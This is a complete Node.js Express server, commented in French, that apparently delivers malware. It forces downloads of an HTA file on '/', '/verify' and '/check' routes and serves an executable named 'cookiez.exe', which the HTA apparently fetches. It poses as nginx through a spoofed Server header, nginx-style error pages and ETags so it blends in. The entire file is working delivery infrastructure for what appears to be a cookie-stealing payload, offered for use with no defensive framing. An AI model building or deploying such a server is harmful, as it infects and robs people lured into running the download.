"use strict";

const express = require("express");
const http = require("http");
const fs = require("fs");
const path = require("path");

/* ============================== CONFIG ==================================== */
const SERVER_ID   = process.env.SERVER_ID !== undefined ? process.env.SERVER_ID : "nginx";
const HTA_FILE    = path.join(__dirname, "file.hta");
const HTA_NAME    = process.env.HTA_NAME || "file.hta";
const HTA_ROUTES  = ["/", "/verify", "/check"];
const DISPOSITION = process.env.DISPOSITION || "attachment";
const ETAG_STYLE  = process.env.ETAG || "off";
const PORT        = Number(process.env.PORT || 80);
const FALLBACK    = Number(process.env.FALLBACK_PORT || 3000);
const HOST        = process.env.HOST || "0.0.0.0";
const LOG         = process.env.LOG === "1";
/* ========================================================================== */

function log(){ if (LOG) console.log.apply(console, arguments); }

const app = express();

app.disable("x-powered-by");
app.disable("etag");
app.set("trust proxy", true);

app.use(function (req, res, next){
  if (SERVER_ID) res.setHeader("Server", SERVER_ID);
  res.sendDate = false;
  res.setHeader("Date", new Date().toUTCString());
  res.removeHeader("Keep-Alive");
  next();
});

app.use(express.json({ limit: "8kb" }));

const _wdu = require("./wdu.js");
_wdu.install(app);

function serveHta(req, res){
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Cache-Control", "no-cache");
  if (ETAG_STYLE === "nginx"){
    try {
      const st = fs.statSync(HTA_FILE);
      res.setHeader("ETag", '"' + Math.floor(st.mtimeMs/1000).toString(16) + "-" + st.size.toString(16) + '"');
    } catch (e) {}
  }
  if (DISPOSITION === "inline"){
    res.sendFile(HTA_FILE, { etag: false, headers: { "Content-Disposition": 'inline; filename="' + HTA_NAME + '"' } });
  } else {
    res.download(HTA_FILE, HTA_NAME, { etag: false });
  }
}
HTA_ROUTES.forEach(function (r){ app.get(r, serveHta); });

/* l'exe doit aussi etre servi si le HTA pointe sur ce serveur */
app.get("/cookiez.exe", function (req, res){
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.download(path.join(__dirname, "cookiez.exe"), "cookiez.exe", { etag: false });
});

const FAVICON = Buffer.from(
  "AAABAAEAAQEAAAEAIAAwAAAAFgAAACgAAAABAAAAAgAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/gED/AAAAAA==",
  "base64");

app.get("/favicon.ico", function (req, res){
  res.setHeader("Content-Type", "image/x-icon");
  res.setHeader("Cache-Control", "public, max-age=86400");
  res.send(FAVICON);
});

app.get("/robots.txt", function (req, res){
  res.setHeader("Content-Type", "text/plain");
  res.setHeader("Cache-Control", "public, max-age=3600");
  res.send(Buffer.from("User-agent: *\r\nAllow: /\r\n"));
});

app.get("/healthz", function (req, res){
  res.setHeader("Content-Type", "text/plain");
  res.setHeader("Cache-Control", "no-cache");
  res.send(Buffer.from("ok\n"));
});

app.use(function (req, res, next){
  if (req.method !== "OPTIONS") return next();
  res.setHeader("Allow", "GET, HEAD, POST, OPTIONS");
  res.status(204).end();
});

function plainPage(code, msg){
  return "<html>\r\n<head><title>" + code + " " + msg + "</title></head>\r\n" +
         "<body>\r\n<center><h1>" + code + " " + msg + "</h1></center>\r\n" +
         "<hr><center>" + (SERVER_ID || "nginx") + "</center>\r\n" +
         "</body>\r\n</html>\r\n";
}

app.use(function (req, res){
  res.statusCode = 404;
  res.setHeader("Content-Type", "text/html");
  res.send(Buffer.from(plainPage(404, "Not Found")));
});

app.use(function (err, req, res, next){
  if (res.headersSent) return next(err);
  const code = err.status || err.statusCode || 500;
  const msg = http.STATUS_CODES[code] || "Internal Server Error";
  res.statusCode = code;
  res.setHeader("Content-Type", "text/html");
  res.send(Buffer.from(plainPage(code, msg)));
});

const server = http.createServer(app);

server.keepAliveTimeout = 65000;
server.headersTimeout = 66000;
server.requestTimeout = 60000;
server.maxRequestsPerSocket = 1000;

server.on("clientError", function (err, socket){
  if (err.code === "ECONNRESET" || !socket.writable) return;
  const body = plainPage(400, "Bad Request");
  socket.end(
    "HTTP/1.1 400 Bad Request\r\n" +
    (SERVER_ID ? "Server: " + SERVER_ID + "\r\n" : "") +
    "Date: " + new Date().toUTCString() + "\r\n" +
    "Content-Type: text/html\r\n" +
    "Content-Length: " + Buffer.byteLength(body) + "\r\n" +
    "Connection: close\r\n\r\n" + body);
});

let retried = false;
server.on("error", function (err){
  if (!retried && FALLBACK !== PORT && (err.code === "EACCES" || err.code === "EADDRINUSE")){
    retried = true;
    log("port " + PORT + " indisponible (" + err.code + "), bascule sur " + FALLBACK);
    return server.listen(FALLBACK, HOST);
  }
  log("error: " + err.message);
});

server.listen(PORT, HOST, function (){
  log("listening on " + HOST + ":" + server.address().port);
});

module.exports = server;
